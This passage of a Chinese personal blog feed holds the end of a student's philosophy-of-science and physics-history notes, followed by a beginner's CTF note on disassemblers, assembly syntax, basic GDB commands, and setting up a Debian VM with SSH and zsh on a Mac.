Weyl调和了两个思想.&lt;/li&gt;
  &lt;li&gt;形式主义 &lt;strong&gt;Formalism&lt;/strong&gt;: David Hilbert   &lt;br /&gt;
Gödel Incomplereness Theorem否定了形式主义&lt;/li&gt;
  &lt;li&gt;逻辑主义 &lt;strong&gt;Logicism&lt;/strong&gt;: Russel&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其他的数学主义:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Mathematical Platonism&lt;/strong&gt; 数学柏拉图主义 (Penrose提出)   &lt;br /&gt;
有点像是”地球没了你也照样转”, 认为存在绝对的数学世界   &lt;br /&gt;
类似的有Karl Popper的Three World Theory: 有三个世界, Physical World, 
Subjective World, Objective World. 从单纯的唯心唯物的二分(笛卡尔), 
到了加入客观知识的三分(康德).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Conventionalism&lt;/strong&gt; 约定主义: Henri Poincaré  &lt;br /&gt;
客观性的标准也是建立在主观公理的基础上, 就是人为规定的convention, 
对于这样的公理约定, 要满足不和公认的事实矛盾.   &lt;br /&gt;
虽然一开始约定主义是来源于政治的:
    &lt;ul&gt;
      &lt;li&gt;伊壁鸠鲁: 在肯定感觉主义的基础上继承并发展德漠克利特的原子说, 
强调了人们在感觉, 经验方面相互约定的必要性, 进一步把约定的思想推广到政治, 
道德, 法律等领域(后代社会契约论)&lt;/li&gt;
      &lt;li&gt;哲学: 人类社会越发展, 自然关系在人身上的作用就越淡化, 
人就越成为社会的存在物.
        &lt;blockquote&gt;
          &lt;p&gt;个人只有作为交换价值的生产者才能存在, 而这种情况就已经包含着
对个人的自然存在的完全否定, 因而个人完全是由社会决定的.   &lt;br /&gt;
马克思在分析资本主义关系中的个人&lt;/p&gt;
        &lt;/blockquote&gt;
      &lt;/li&gt;
      &lt;li&gt;数学: 主要体现是Poincaré主导的(前)直觉主义
        &lt;blockquote&gt;
          &lt;p&gt;He held that axioms in geometry should be chosen for the results 
they produce, not for their apparent coherence with - possibly flawed - 
human intuitions about the physical world.&lt;/p&gt;
        &lt;/blockquote&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对待数学的几种态度&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;本质主义&lt;/li&gt;
  &lt;li&gt;科学实在论&lt;/li&gt;
  &lt;li&gt;工具主义&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;gödel-不完备性定理&quot;&gt;Gödel 不完备性定理&lt;/h3&gt;
&lt;p&gt;完备性和一致性不可兼得.&lt;/p&gt;

&lt;p&gt;注记:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Heisenberg Uncetainty&lt;/li&gt;
  &lt;li&gt;Niels Bohr Complementarity&lt;/li&gt;
  &lt;li&gt;Self-Reference Paradox 自我指涉的悖论&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;关于Gödel 不完备性定理的第一条有三种证明:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;模型论 - 塔尔斯基&lt;/li&gt;
  &lt;li&gt;证明论 - 罗德尔 · 罗瑟&lt;/li&gt;
  &lt;li&gt;递归论 - 丘奇 · 图灵  &lt;br /&gt;
递归论的方法我应该可以理解, 主要的&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;关于Gödel:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;John Wheeler有一段时间关注Heisenberg Uncetainty和Gödel Incompleteness的
两个理论的联系(其中一个给出了定量的不可兼得的程度, 另外一个则没有), 但是, 
当他跑去问Gödel的时候(当时Gödel在屋子里面, 腿上盖着一条毛毯), 听到之后, 
立刻大怒: “Get Out!” (据说是因为当时Einstein很烦量子力学, 每天和Gödel散步时, 
就把Gödel washbrained了)&lt;/li&gt;
  &lt;li&gt;Gödel年轻的时候娶了一个比他大六岁的舞女, 晚年只信任自己的老婆
(只吃老婆做的饭, 但是他老婆身体也不是很好, 所以也有说他是饿死的)
和王浩(华人里最厉害的逻辑学家, 为Gödel写了传记)&lt;/li&gt;
  &lt;li&gt;Einstein 享受和Gödel一起上下班聊天的快乐&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;叔本华的哲学&quot;&gt;叔本华的哲学&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;人生实如钟摆, 在痛苦与倦怠中徘徊.   &lt;br /&gt;
Schopenhauer’s Pendulem&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;“艺术是人们逃离痛苦的途径之一”&lt;/li&gt;
  &lt;li&gt;被评价为无家可归者, 悲观主义者, 悲剧主义的代表&lt;/li&gt;
  &lt;li&gt;叔本华信奉古印度哲学, 吠檀多学派&lt;/li&gt;
  &lt;li&gt;和黑格尔的争斗: 故意选择和黑格尔相同的上课时间&lt;/li&gt;
  &lt;li&gt;薛定谔非常佩服叔本华
    &lt;ul&gt;
      &lt;li&gt;薛定谔后期, 说自己虽然是个物理学家, 但是除了上课, 其他时间都在搞哲学. 
写了一本哲学小书: &lt;em&gt;What is Life?&lt;/em&gt;, 利用了负熵的概念, 第一次定义了死亡: 
上趋于无穷大就是死亡&lt;/li&gt;
      &lt;li&gt;叔本华很喜欢狗(named Atma), 在自己的书中有猫的存在, 于是影响了薛定谔, 
这就是薛定谔的猫的来历(不知道); 也有说是因为用猫更加受欢迎.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;叔本华”骂”狗: “You are not a dog! You are a human! a human!”&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;quantum-computer&quot;&gt;Quantum Computer&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;Nature isn’t classical, damnit, 
and if you want to make a Simulation of nature, 
you’d better make it quantum mechanical, and by golly, 
it’s a wonderful problem because it doesn’t look easy.   &lt;br /&gt;
Richard Feynman, 1981, First Conf. Physics and Computation, MIT&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;杂项&quot;&gt;杂项&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Heisemberg原来是搞流体力学的, 博士论文解不出来, 最后只好猜了一个解
(后来这个解被林家翘(导师:冯 · 卡门)证明了)&lt;/li&gt;
  &lt;li&gt;狄拉克原来是搞EE的, “工程学对我最大的启发: 工程学能够容忍误差”&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;the Feynman principle&lt;/strong&gt;: do not fool yourself
    &lt;blockquote&gt;
      &lt;p&gt;The first principle is that you must not fool yourself, 
and you are the easiest person to fool&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;老玻尔也干了很多的糊涂的事, 比如曾经就提出了动量不守恒的猜测BKS
    &lt;blockquote&gt;
      &lt;p&gt;If so(BKS), I’d rather be a cobbler or even am employee 
in a gambling house than a physics.   &lt;br /&gt;
Einstein对BKS的反对&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Einstein 也有错误地时候, 晚年认为引力波不存在, 结果被退稿了, 
于是就对审稿人大发雷霆, “我给你们发稿子是让你们发表的, 不是让你们审稿的. “
审稿人说, 这是为了保留他的名誉. (编辑的重要性)&lt;/li&gt;
  &lt;li&gt;物理学的梗:
    &lt;blockquote&gt;
      &lt;p&gt;No idea from Lifshitz, No words from Landan. (朗道力学的梗)&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;社会静力学: Comte, 弹性: 偏离了正常秩序后恢复正常的能力&lt;/li&gt;
  &lt;li&gt;Spencer: &lt;em&gt;Social Statics&lt;/em&gt;, &lt;em&gt;First Pinciples&lt;/em&gt;, 
认为人生最大的意义就是为了得到最大的幸福
    &lt;blockquote&gt;
      &lt;p&gt;the greatest happiness of greatest number    &lt;br /&gt;
(注: 我觉得老师课上的这个概括不是特别的到位, 因为我看了书的一小部分, 
里面虽然一开始就提出了这个概念, 但是随之就开始了思考: 什么是幸福? 
因为幸福是一个对不同的人有不同的答案的问题. 所以我认为, 我需要继续读下去. )&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;经济物理学: Ecopnohysics:Stanley&lt;/li&gt;
  &lt;li&gt;心理学中的场论&lt;/li&gt;
  &lt;li&gt;历史微积分: 托尔斯泰
    &lt;blockquote&gt;
      &lt;p&gt;只有采取无限小的观察单位 – 历史的微分, 并运用积分的方法得到这些无限小的
总和, 我们才能得到问题的答案 – 历史的规律, 正是这种微积分, 
纠正了人类由于只观察个别单位所不能不犯下的和无法避免的错误.    &lt;br /&gt;
&lt;em&gt;战争与和平&lt;/em&gt;&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;世界科学中心的转移: 意大利 -&amp;gt; 法国 -&amp;gt; 英国 -&amp;gt; 德国 -&amp;gt; 美国, 日本   &lt;br /&gt;
世界科学中心需要有&lt;strong&gt;学术大师&lt;/strong&gt;和&lt;strong&gt;教育大师&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;其他部分&quot;&gt;其他部分&lt;/h2&gt;
&lt;h3 id=&quot;目标&quot;&gt;目标&lt;/h3&gt;
&lt;p&gt;再一次提一下这个学习的目标:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;social responsibility&lt;/li&gt;
  &lt;li&gt;leader education&lt;/li&gt;
  &lt;li&gt;liberal arts&lt;/li&gt;
  &lt;li&gt;philosophy of science&lt;/li&gt;
  &lt;li&gt;critical thinking&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;胡适的君子标准:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;不降志(屡败屡战)&lt;/li&gt;
  &lt;li&gt;不辱身&lt;/li&gt;
  &lt;li&gt;不追求时髦&lt;/li&gt;
  &lt;li&gt;也不回避危险&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;后记&quot;&gt;后记&lt;/h3&gt;
&lt;p&gt;以上的内容, 几乎完全没有在考试中出现, 笑. (哭)&lt;/p&gt;

&lt;p&gt;就是挺迷惑的.&lt;/p&gt;</content><author><name></name></author><category term="notes" /><summary type="html">力学 The End 就是对这个学期学的力学的完全的不完全归纳复习. 应该会有和之前的重复的部分, 就当是一个学吧.</summary></entry><entry><title type="html">Untitled(2)</title><link href="http://0.0.0.0:4000/ctf/untitled(2)/" rel="alternate" type="text/html" title="Untitled(2)" /><published>2021-12-15T07:23:09+00:00</published><updated>2021-12-15T07:23:09+00:00</updated><id>http://0.0.0.0:4000/ctf/untitled(2)</id><content type="html" xml:base="http://0.0.0.0:4000/ctf/untitled(2)/">&lt;h1 id=&quot;untitled-02&quot;&gt;Untitled (02)&lt;/h1&gt;
&lt;p&gt;这里记录一些打ctf中遇到的很多的东西和技术.&lt;/p&gt;

&lt;h2 id=&quot;反编译&quot;&gt;反编译&lt;/h2&gt;
&lt;p&gt;得到一个程序, 程序可以运行, 
但是程序并不一定会告诉我们它是怎么运行的, 
因为一般来说程序是一个黑箱模型.&lt;/p&gt;

&lt;p&gt;但是这不代表我们不可以把程序给”解剖”了再研究.&lt;/p&gt;

&lt;p&gt;但是假如没有很好的工具的话, 直接强开程序的话, 
一般的结果就是得到一堆乱码. 或者可以用十六进制查看, 
在mac上的工具是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hexdump&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0000000 3a 30 33 30 30 30 30 30 30 30 32 30 30 30 36 46
0000010 35 0a 3a 30 33 30 30 35 46 30 30 30 32 30 30 30
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;这就是看出来的结果. 
(虽然和乱码是没什么区别的. 但是据说会有用. )&lt;/p&gt;

&lt;p&gt;(确实很有用, 可以试试直接编辑里面的一部分东西, 
可以做到魔改程序的效果, 比如说更改打印输出的结果, 破解程序之类的. )&lt;/p&gt;

&lt;p&gt;虽然一般解剖的结果都丑得不得了, 并且甚至还会有些程序, 
很厉害, 会”反抗”(就是有很多混淆的操作).&lt;/p&gt;

&lt;p&gt;但是总而言之, 解剖就完事了.&lt;/p&gt;

&lt;p&gt;下面是一些解剖程序的工具的推荐:&lt;/p&gt;

&lt;h3 id=&quot;ida-pro&quot;&gt;IDA PRO&lt;/h3&gt;
&lt;p&gt;好用的东西, 虽然很丑, 并且在mac m1上破解版几乎已经消失了. 
但是免费版本也可以支持简单的伪代码反汇编, 所以还是可以用的.&lt;/p&gt;

&lt;h3 id=&quot;hopper-disassembler&quot;&gt;Hopper Disassembler&lt;/h3&gt;
&lt;p&gt;好东西, 长得很mac风格, 虽然没有那么强大. 
但是免费的版本除了不能保存和设置断点, 
其他所有的都可以啊. 这不是爽爆?&lt;/p&gt;

&lt;h3 id=&quot;ghidra&quot;&gt;Ghidra&lt;/h3&gt;
&lt;p&gt;可以看作是一个开源的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ida&lt;/code&gt;, 不是很会, 刚刚接触. 
据说很强.&lt;/p&gt;

&lt;h2 id=&quot;汇编语言&quot;&gt;汇编语言&lt;/h2&gt;
&lt;p&gt;很多时候得到的反汇编结果就是以汇编语言的方式来表示的. 
因为有时候直接的程序反汇编的结果不会很人性化, 
所以了解汇编会比较方便一点.&lt;/p&gt;

&lt;p&gt;并且汇编语言据说在很多的时候都很有用, 学了不亏.&lt;/p&gt;

&lt;p&gt;但是我现在只能看懂很短的汇编, 对长的东西还是吃不消, 看不懂.&lt;/p&gt;

&lt;h3 id=&quot;x86&quot;&gt;x86&lt;/h3&gt;
&lt;p&gt;这个教程太多了, 网上一大堆. 搜就完事了, 
不过一般是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Intel&lt;/code&gt;的语法, 很少有另外一种&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AT&amp;amp;T&lt;/code&gt;的语法的教程.&lt;/p&gt;

&lt;h4 id=&quot;intel-syntax&quot;&gt;Intel-syntax&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Intel&lt;/code&gt;语法看上去很清楚, 没有像&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;At&amp;amp;T&lt;/code&gt;语法的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%&lt;/code&gt;或是别的什么符号.&lt;/p&gt;

&lt;p&gt;有一个区别就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Intel&lt;/code&gt;的语法是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;指令 目的, 源&lt;/code&gt;的类型. 
要注意方向. 就是不要搞错了.&lt;/p&gt;

&lt;h4 id=&quot;att-syntax&quot;&gt;AT&amp;amp;T-syntax&lt;/h4&gt;
&lt;p&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Intel&lt;/code&gt;的语法的区别是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;指令 源, 目的&lt;/code&gt;的类型, 
稍微好理解一点. 但是寄存器就有点麻烦. 虽然不知道该不该这样说, 
但是原则上和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Intel&lt;/code&gt;的差不了太多.&lt;/p&gt;

&lt;p&gt;有一个简单快捷的&lt;a href=&quot;https://csiflabs.cs.ucdavis.edu/~ssdavis/50/att-syntax.htm&quot;&gt;网站&lt;/a&gt;
来教这个, 姑且算是够用吧.&lt;/p&gt;

&lt;h3 id=&quot;arm&quot;&gt;ARM&lt;/h3&gt;
&lt;p&gt;不得不说, 感觉真的要把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arm&lt;/code&gt;架构吹爆, 因为看起来就很简单, 
并且最重要的是我可以用这个来很轻松地解决
(假的, 只能解决简单的. )汇编. 
但是看懂应该不是问题.&lt;/p&gt;

&lt;h2 id=&quot;gdb&quot;&gt;GDB&lt;/h2&gt;
&lt;p&gt;非常好用的一个调试的工具.&lt;/p&gt;

&lt;p&gt;这个东西的想法就是, 我可以在程序运行的时候(几乎)任意地按下暂停键, 
并且还可以轻松地查看内存里面的东西以及(任意地, 应该)修改.&lt;/p&gt;

&lt;p&gt;这个里面有很多的好东西可以介绍. 这里只能介绍一些我用过的简单的功能.&lt;/p&gt;

&lt;p&gt;打开程序进行调试模式.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt; gdb ./test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;设置一个断点. (这里在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;函数这里设置了断点, 也就是说, 
在程序运行到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;函数的时候, 还没有运行, 但是已经进入了栈, 
这个时候就停止运行, 等待进一步调试. )&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) break main
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;查看函数信息, 寄存器信息, 查看反编译的程序, 设置反编译的语法.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) info functions
(gdb) info registers
(gdb) disas
(gdb) set disassembly-favor intel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;运行程序, 运行单条指令, 在停止的时候继续运行, 停止运行, 退出.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) run
(gdb) step
(gdb) continue
(gdb) stop
(gdb) quit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修改寄存器, 跳转到某个地址运行(星号表示取地址了).&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) set $rip=0x...
(gdb) jump *0x...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(注: 这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;的东西可以看后面. 
反正就是一个类似于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hello world&lt;/code&gt;的东西)&lt;/p&gt;

&lt;p&gt;(注: 其实有命令的缩写, 网上有教程很多的, 不过目前没看到很好的. 
总之就是多查吧. )&lt;/p&gt;

&lt;h2 id=&quot;utm-虚拟机&quot;&gt;UTM 虚拟机&lt;/h2&gt;
&lt;p&gt;感觉这个才是我真正想讲的东西.&lt;/p&gt;

&lt;p&gt;(注: 如果你不是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mac&lt;/code&gt;作死用户的话, 还是用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows&lt;/code&gt;下的虚拟机吧, 
后者太舒服了, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vm player&lt;/code&gt;就很不错了, 简直可以说是超贴心的. )&lt;/p&gt;

&lt;p&gt;因为最近为了做一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;i836&lt;/code&gt;就是32位的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x86&lt;/code&gt;的程序的逆向, 
终于在虚拟机里安装了一个新的, 刚好可以记录一下.&lt;/p&gt;

&lt;h3 id=&quot;安装过程&quot;&gt;安装过程&lt;/h3&gt;
&lt;p&gt;首先要下载&lt;a href=&quot;https://mac.getutm.app&quot;&gt;虚拟机&lt;/a&gt;和系统镜像. 
镜像建议不要选太激进的(呵, 为了精简而删得只有几&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mb&lt;/code&gt;的系统我有点怕), 
也不要选太友好的(安装完就接近十个G的巨无霸, 还有图形界面的就很…).&lt;/p&gt;

&lt;p&gt;(因为现在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x86&lt;/code&gt;的架构系统少得可怜, 
之前的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ubuntu server&lt;/code&gt;早就停止支持了, 所以我用的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debian&lt;/code&gt;, 
&lt;a href=&quot;https://www.debian.org&quot;&gt;这个&lt;/a&gt;还有支持, 不错. )&lt;/p&gt;

&lt;p&gt;然后在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UTM&lt;/code&gt;里面选择&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Start form Scratch&lt;/code&gt;, 
然后主要要修改的地方有:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System&lt;/code&gt;里面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Architecture&lt;/code&gt;, 就是系统的架构&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Drive&lt;/code&gt;里面分配硬盘
    &lt;ul&gt;
      &lt;li&gt;分一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Removable&lt;/code&gt;的用来放安装镜像文件&lt;/li&gt;
      &lt;li&gt;在分一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10G&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IDE&lt;/code&gt;的硬盘&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Network&lt;/code&gt;里面:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Network Mode&lt;/code&gt;选择&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Emulated VLAN&lt;/code&gt;模拟&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VLAN&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Emulated Network Card&lt;/code&gt;选&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virtio-net-pci&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Port Forward&lt;/code&gt;里新建一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Guset Port&lt;/code&gt;设为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22&lt;/code&gt;, 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host Port&lt;/code&gt;则为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2200&lt;/code&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(注: 那个显示模式可以选. 但是好像不是所有的系统都支持. 
就算了吧. )&lt;/p&gt;

&lt;p&gt;然后(选择安装镜像)就可以启动再安装了. 应该没问题了.&lt;/p&gt;

&lt;h3 id=&quot;ssh&quot;&gt;SSH&lt;/h3&gt;
&lt;h4 id=&quot;安装&quot;&gt;安装&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open-ssh&lt;/code&gt;在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ubuntu server&lt;/code&gt;里面应该是有的. 所以可以直接用.&lt;/p&gt;

&lt;p&gt;但是在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debian&lt;/code&gt;里面没有, (假如没有的话, 就要安装). 
检查有没有的方式就是:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemctl status ssh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;假如有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;active(running)&lt;/code&gt;的提示的话就好了.&lt;/p&gt;

&lt;p&gt;你说没有? 简单. 直接来一梭子:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install openssh-server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemctl start ssh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;连接&quot;&gt;连接&lt;/h4&gt;
&lt;p&gt;电脑和虚拟机的连接可以用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;来搞. 虽然没有图形界面, 但是很方便. 
只要填好自己系统的用户名和之前设置的端口就好了.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh user_name@127.0.0.1 -p 2200
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;文件传输&quot;&gt;文件传输&lt;/h4&gt;
&lt;p&gt;可以利用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp&lt;/code&gt;命令来拷贝文件. 很方便的.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp local_file user_name@127.0.0.1:remote_location
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;zsh&quot;&gt;ZSH&lt;/h3&gt;
&lt;p&gt;这个是一个命令行的神器, 确切来说就是一个终端吧.&lt;/p&gt;

&lt;p&gt;配置嫌麻烦的话可以直接上&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;oh-my-zsh&lt;/code&gt;, 但是这样不符合我作的本质. 
所以我参考了&lt;a href=&quot;https://zhuanlan.zhihu.com/p/347772529&quot;&gt;这里&lt;/a&gt;, 
配了一个简单版的, 毕竟目前没有太多的用处, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux&lt;/code&gt;也不敢说会用, 
还在学.&lt;/p&gt;

&lt;p&gt;首先是安装&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt;, 包管理器来一炮:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install zsh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后安装几个插件:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 自动补全
git clone https://github.com/zsh-users/zsh-autosuggestions ~/.zsh/plugins/zsh-autosuggestions

# 语法高亮
git clone https://github.com/zsh-users/zsh-syntax-highlighting ~/.zsh/plugins/zsh-syntax-highlighting
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;国内的话, 可以试试镜像站点
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://hub.fastgit.org/zsh-users/zsh-autosuggestions&lt;/code&gt;
还有
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://hub.fastgit.org/zsh-users/zsh-syntax-highlighting&lt;/code&gt;. 
不过好像有些时候还挺快的, 看天气吧.&lt;/p&gt;

&lt;p&gt;然后修改&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.zshrc&lt;/code&gt;的文件(就是配置文件)(可能要&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim ~/.zshrc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 启用插件
source ~/.zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh
source ~/.zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh

# 启用彩色提示符
